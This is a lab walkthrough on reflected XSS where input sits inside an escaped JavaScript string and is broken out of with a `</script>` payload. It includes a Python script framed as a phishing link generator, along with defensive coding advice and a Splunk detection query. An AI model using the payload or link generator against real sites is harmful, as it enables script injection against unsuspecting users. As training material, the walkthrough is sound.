
# Lab Walkthrough: Reflected XSS into a JavaScript String (Escaping Bypass)

* **Vulnerability Type:** Reflected Cross-Site Scripting (XSS)
* **Target Context:** Client-Side JavaScript String Literal (HTML Parser Precedence)
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]  
> The methodologies, payloads, and technical documentation contained in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](#1-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](#2-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](#3-step-by-step-exploitation-flow)
4. [Execution Insight: Parser Precedence](#4-execution-insight-parser-precedence)
5. [Automated Exploitation Script (Python PoC)](#5-automated-exploitation-script-python-poc)
6. [Defense, Hardening & Secure Coding](#6-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](#7-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](#8-troubleshooting--diagnostic-runbook)

---

## 1. Vulnerability Architecture & Mechanism

Reflected XSS within a JavaScript context often faces strict sanitization. In this lab, the backend application dynamically embeds user input directly into a JavaScript string variable but properly escapes single quotes (`'`) and backslashes (`\`) to prevent attackers from breaking out of the string boundary.

* **The Core Flaw:** The developers secured the *JavaScript* parsing context but forgot about the *HTML* parsing context. The JavaScript code is embedded within an inline HTML `<script>` block.
* **The Mechanism:** The browser's HTML parser processes the document from top to bottom. When it encounters the literal string `</script>`, it immediately terminates the current script block, regardless of whether that string is enclosed inside valid JavaScript quotes.
* **Real-World Analogy:** Imagine writing a letter (JavaScript) inside a secure envelope (the `<script>` tag). The mailroom (HTML parser) is instructed to seal the envelope the moment it sees the words "END OF LETTER" (`</script>`). Even if you write those words as part of a quote inside your letter (e.g., *He said "END OF LETTER"*), the mailroom blindly follows its primary instruction, seals the envelope prematurely, and treats everything written afterward as a completely separate package.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   HTML PARSER OVERRIDE (SCRIPT BREAKOUT)               │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker Input] 
  </script><script>alert(1)</script>
           │
           ▼
  [2. Server Backend (Flawed Sanitization)]
  Escapes quotes/slashes, but allows angle brackets.
           │
           ▼
  [3. Rendered DOM]
  <script>
      var searchTerms = '</script><script>alert(1)</script>';
  </script>
           │
           ▼
  [4. Browser Execution Order]
  - HTML Parser sees `<script>`. Hands execution to JS Engine.
  - HTML Parser continues scanning for `</script>`.
  - It finds `</script>` inside the string literal and instantly terminates the block.
  - JS Engine throws a SyntaxError (unterminated string literal).
  - HTML Parser sees the next `<script>` tag, opens a NEW execution block, and 
    executes `alert(1)`.

```

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The search query tracking functionality.
* **Primary Objective:** Break out of the securely escaped JavaScript string by exploiting the browser's HTML parser precedence, terminating the script block, and executing a new one.
* **Validation Signal:** The lab is marked solved when the `alert(1)` pop-up executes in the browser.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Context Mapping & Sanitization Probing

* Inject a distinct string into the search bar: `CyberTest`.
* Intercept the request and view the response in Burp Repeater.
* *Observation:* The input is reflected inside a JavaScript variable: `var searchTerms = 'CyberTest';`
* **Test String Boundary:** Attempt to break the JS string using a single quote: `test'payload`.
* *Observation:* The backend successfully escapes it: `var searchTerms = 'test\'payload';`. You cannot execute code within this specific `<script>` block.

### Phase 2: Payload Construction (The Breakout)

* Because the JS string boundary is secure, you must destroy the entire `<script>` block using HTML markup.
* **The Injection:** `</script><script>alert(1)</script>`
1. `</script>`: Instructs the browser's HTML parser to close the current block immediately.
2. `<script>`: Opens a brand-new, attacker-controlled execution block.
3. `alert(1)`: The execution sink.
4. `</script>`: Closes the attacker's block cleanly.



### Phase 3: Execution

* Inject the payload into the search bar.
* *Result:* The browser parses the malicious input as structural HTML, overriding the JavaScript string literal, and fires the alert.

---

## 4. Execution Insight: Parser Precedence

A critical concept in web security is **Parser Precedence**. Browsers employ multiple parsers (HTML, URL, CSS, JavaScript) that operate simultaneously and hand off control to one another.

The HTML parser is the master parser. It does not understand JavaScript syntax. It doesn't know what a JavaScript string literal (`'...'`) is, nor does it care about JavaScript comments (`//`). Its only job when scanning a `<script>` block is to find the exact character sequence `</script>` to resume standard HTML rendering. By feeding the HTML parser exactly what it is looking for, attackers can hijack the execution state of the page.

---

## 5. Automated Exploitation Script (Python PoC)

This script generates the URL-encoded weaponized link designed to exploit the HTML parser precedence vulnerability.

```python
#!/usr/bin/env python3
"""
Reflected XSS (Script Breakout) Weaponized Link Generator
Exploits HTML parser precedence over JavaScript string literals.
"""

import urllib.parse
import sys

def generate_phishing_link(target_url):
    # Payload terminates the parent block and introduces a new one
    raw_payload = "</script><script>alert(1)</script>"
    
    # URL encode the payload for safe HTTP transport
    encoded_payload = urllib.parse.quote(raw_payload)
    
    # Construct the final weaponized URL
    weaponized_link = f"{target_url}/?search={encoded_payload}"
    
    print("[*] Generating Weaponized XSS Link...")
    print(f"[+] Distribute this URL to target: \n{weaponized_link}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script_breakout_xss.py <target_base_url>")
        sys.exit(1)
        
    target = sys.argv[1].rstrip('/')
    generate_phishing_link(target)

```

---

## 6. Defense, Hardening & Secure Coding

Server-side escaping mechanisms often fail when developers do not account for the overlapping contexts (HTML vs. JS) in which data is rendered.

* **Use `data-*` Attributes (Primary Defense):** Never dynamically inject user input directly into inline `<script>` blocks. Instead, safely HTML-encode the data into a `data-*` attribute on an HTML element, and use JavaScript DOM APIs to read it.
* *Secure HTML:* `<div id="searchData" data-term="&lt;script&gt;..."></div>`
* *Secure JS:* `var searchTerms = document.getElementById('searchData').dataset.term;`


* **Unicode Escaping:** If dynamic injection into a JS variable is unavoidable, use strict Unicode hex-escaping for *all* non-alphanumeric characters. For example, converting `<` to `\u003c` and `/` to `\u002f`.
* `var searchTerms = '\u003c\u002fscript\u003e';` (This renders the breakout structurally inert).



---

## 7. SIEM Detection & Telemetry Analysis

Detecting script breakout attempts requires monitoring input fields for explicit HTML closing tags.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| eval decoded_query=urldecode(uri_query)
| regex decoded_query="(?i)</script>\s*<script>"
| stats count by src_ip, uri_path, decoded_query
| where count > 0

```

*Indicator of Attack (IoA):* The sequence `</script>` appearing in a URL parameter is highly anomalous for legitimate traffic and strongly indicates an attempt to prematurely terminate a server-generated script block.

---

> **Key Insight:** Securing data requires sanitizing it for the *ultimate* execution context, not just the immediate one. Escaping quotes protects the JavaScript string, but because that string lives inside HTML, it remains fully vulnerable to HTML-level structural manipulation.

```

```
